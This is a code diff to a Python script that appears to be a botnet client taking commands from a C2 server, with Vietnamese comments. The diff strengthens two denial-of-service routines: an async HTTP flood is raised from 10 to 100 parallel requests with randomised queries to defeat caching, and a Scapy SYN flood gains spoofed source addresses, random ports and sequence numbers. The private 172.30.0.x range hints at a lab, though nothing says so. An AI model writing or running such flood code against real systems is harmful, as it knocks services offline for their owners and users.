@@ -25,14 +25,14 @@ async def flood_http(target_ip, port, duration):
             }
             path = f"/?q={random.randint(1, 100)}"  # Random hóa query để tránh cache
             response = await client.get(path, headers=headers, timeout=2)
-            print(f"Request sent to {target_url}, Status Code: {response.status_code}")
+            print(f"Request sent to {target_url}, Code: {response.status_code}, Response: {response}")
         except:
             pass
 
     async def flood():
         async with httpx.AsyncClient(base_url=target_url, timeout=2) as client:
             while time.time() < timeout:
-                tasks = [send_request(client) for _ in range(10)]  # Gửi 100 request song song
+                tasks = [send_request(client) for _ in range(100)]  # Gửi 100 request song song
                 await asyncio.gather(*tasks)
 
     await flood()
@@ -42,10 +42,18 @@ def syn_flood(target_ip, port, duration):
     print(f"[+] SYN flood -> {target_ip}:{port} for {duration}s")
     timeout = time.time() + duration
     while time.time() < timeout:
-        ip = IP(dst=target_ip)
-        tcp = TCP(dport=port, flags="S")
-        pkt = ip/tcp
-        send(pkt, verbose=0)
+        # ip = IP(dst=target_ip)
+        # tcp = TCP(dport=port, flags="S")
+        # pkt = ip/tcp
+        ip = IP(src= f"172.30.0.{random.randint(10, 250)}",
+                      dst=target_ip)
+        tcp = TCP(sport=random.randint(1024, 65535),
+                        dport=port,
+                        flags="S",  # SYN
+                        seq=random.randint(0, 4294967295))
+        pkt = ip / tcp
+        print(f"target_ip: {target_ip}, port: {port}, ip: {ip}, tcp: {tcp}, pkt: {pkt}")
+        send(pkt, verbose=False)
 
 # Hàm xử lý các lệnh từ C2
 def handle_command(cmd):
